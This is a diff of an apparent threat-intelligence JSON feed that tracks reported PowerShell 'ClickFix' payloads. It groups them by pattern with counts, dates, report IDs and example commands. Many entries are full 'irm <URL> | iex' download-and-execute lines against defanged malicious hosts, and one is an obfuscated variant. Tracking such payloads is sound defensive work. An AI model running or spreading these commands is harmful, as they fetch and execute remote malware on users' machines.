@@ -1,12 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 168,
-    "ReportCount": 168,
-    "FirstSeen": "2026-11-12T07:54:35.761000+00:00",
+    "DistinctPayloadCount": 167,
+    "ReportCount": 167,
+    "FirstSeen": "2026-11-12T08:34:39.120000+00:00",
     "LastSeen": "2026-11-19T00:34:13.487000+00:00",
     "ReportIds": [
-      "cmwd95g6w02ga0omlk6zhc06u",
       "cmwdakyne02t60omlgkpmg8ab",
       "cmwdd8ni903ki0oml708xi8pf",
       "cmwdguwhj03zw0omlnorqrh3r",
@@ -176,7 +175,6 @@
       "cmwmti3a11uip0omlvh5hjhr9"
     ],
     "PayloadExamples": [
-      "irm 'browse-cloud.codes/013ce88bf8a96d89'|iex;",
       "irm 'browse-cloud.codes/03b93fa50e7a9f43'|iex;",
       "irm 'browse-cloud.codes/045dc45870c27c02'|iex;",
       "irm 'browse-cloud.codes/058ff855ad8e7e30'|iex;",
@@ -722,9 +720,9 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 11,
-    "ReportCount": 59,
+    "ReportCount": 60,
     "FirstSeen": "2026-11-12T08:36:40.257000+00:00",
-    "LastSeen": "2026-11-18T23:56:35.729000+00:00",
+    "LastSeen": "2026-11-19T07:48:24.449000+00:00",
     "ReportIds": [
       "cmwdank3s02v90omlt7vf52av",
       "cmwdauepp02ya0omlq7ew2x4d",
@@ -784,7 +782,8 @@
       "cmwm7i18s1sda0omler9ihr8u",
       "cmwm8sw3e1sgr0omlknxj3rm2",
       "cmwmcr24e1slr0omlt0ye13yq",
-      "cmwms5p8k1uev0omlqz8p9obh"
+      "cmwms5p8k1uev0omlqz8p9obh",
+      "cmwn90gcc1vsl0oml5gkbhzu1"
     ],
     "PayloadExamples": [
       "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
@@ -914,22 +913,6 @@
     ]
   },
   {
-    "Pattern": "(irm '<URL>' -UserAgent 'WUA/<WUA_ID>' -Headers @{'X-WUA'='<WUA_ID>'})|iex",
-    "DistinctPayloadCount": 2,
-    "ReportCount": 3,
-    "FirstSeen": "2026-11-12T07:59:24.865000+00:00",
-    "LastSeen": "2026-11-17T16:32:43.152000+00:00",
-    "ReportIds": [
-      "cmwd9bnf802hk0omlsqvlimv7",
-      "cmwe912g309r10oml56qzo8en",
-      "cmwkwv0pz1gqc0omlgxi8bnwj"
-    ],
-    "PayloadExamples": [
-      "(irm 'https://cosmical2049[.]com/startapv2/f9b9bfb54f8b30ec' -UserAgent 'WUA/b1d0126493' -Headers @{'X-WUA'='b1d0126493'})|iex",
-      "(irm 'https://gfisoda[.]biz/clickfix/8e15947cbef29c2d' -UserAgent 'WUA/1d4b60ce98' -Headers @{'X-WUA'='1d4b60ce98'})|iex"
-    ]
-  },
-  {
     "Pattern": "IRM <URL>\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
     "DistinctPayloadCount": 1,
     "ReportCount": 10,
@@ -979,6 +962,20 @@
     ],
     "PayloadExamples": [
       "powershell \"$o='i8-nkpIEex5Yv1sor';&($($u='';$OFS=$u;\"$($o[6,3,12,15,4,8,2,7,9,5,16,8,14,14,0,15,3])\")) $(&('Invoke-'+'RestMethod') cloudfiare[.]io/u)\""
+    ]
+  },
+  {
+    "Pattern": "(irm '<URL>' -UserAgent 'WUA/<WUA_ID>' -Headers @{'X-WUA'='<WUA_ID>'})|iex",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 2,
+    "FirstSeen": "2026-11-13T00:38:57.467000+00:00",
+    "LastSeen": "2026-11-17T16:32:43.152000+00:00",
+    "ReportIds": [
+      "cmwe912g309r10oml56qzo8en",
+      "cmwkwv0pz1gqc0omlgxi8bnwj"
+    ],
+    "PayloadExamples": [
+      "(irm 'https://gfisoda[.]biz/clickfix/8e15947cbef29c2d' -UserAgent 'WUA/1d4b60ce98' -Headers @{'X-WUA'='1d4b60ce98'})|iex"
     ]
   },
   {
